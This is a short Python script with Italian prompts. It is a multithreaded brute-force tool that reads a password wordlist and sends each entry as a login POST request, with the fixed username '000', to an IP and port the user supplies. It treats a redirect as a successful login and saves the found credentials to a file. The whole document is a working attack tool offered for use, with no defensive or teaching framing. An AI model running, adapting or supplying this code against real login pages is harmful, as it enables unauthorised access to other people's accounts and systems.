import requests,os,sys,time,datetime
from threading import Thread
listT = []
class MyThread(Thread):
    def __init__(self,url,stringa):
        Thread.__init__(self)
        self.stringa = stringa
        self.url = url
        self.ferma = False
    def run(self):
        payload = {"username": "000","password" : ""}
        for x in self.stringa:
            if not self.ferma:
                payload["password"] = x.strip()
                print(x.strip())
                r = requests.post(self.url,data=payload)
                if str(r.url) != self.url:
                    os.system("cls")
                    f = open("url.txt","w")
                    print(f"user --> {payload['username']}\npassword --> {payload['password']}\nurl --> {r.url}",file=f)
                    f.close()
                    self.stop()
                    break
                payload["password"] = []
    def stop(self):
        self.ferma = True
        print("mi fermo")
        
def main():
    inizio = datetime.datetime.now().microsecond
    f = open("pass.txt","r")
    stringa = f.readlines()
    f.close()
    numT = int(input("Quanti thread vuoi usare: "))
    lung = len(stringa)/numT
    url = str("".join(["http://"+input("Inserisci l'ip e porta da attaccare [ip:port]: ")+"/"]).replace(" ",""))
    print(f"Faccio brute force su {url}") 
    time.sleep(2)  
    os.system("cls")
    try:
        for i in range(numT-1):
                listT.append(MyThread(url,stringa[int(i*lung):int(lung*i+lung)].copy()))
                listT[-1].start()
        ok = True
        while ok:
            for x in listT:
                if x.ferma: 
                    for cella in listT:
                        cella.stop()
                        cella.join()
                        ok = False
                    break
    except Exception as e:
        print(f"Errore:\n{e}\n")
    finally:
        fine = datetime.datetime.now().microsecond
        print(f"Tempo trascorso: {(inizio-fine)/1000}")
        
if __name__=="__main__":main()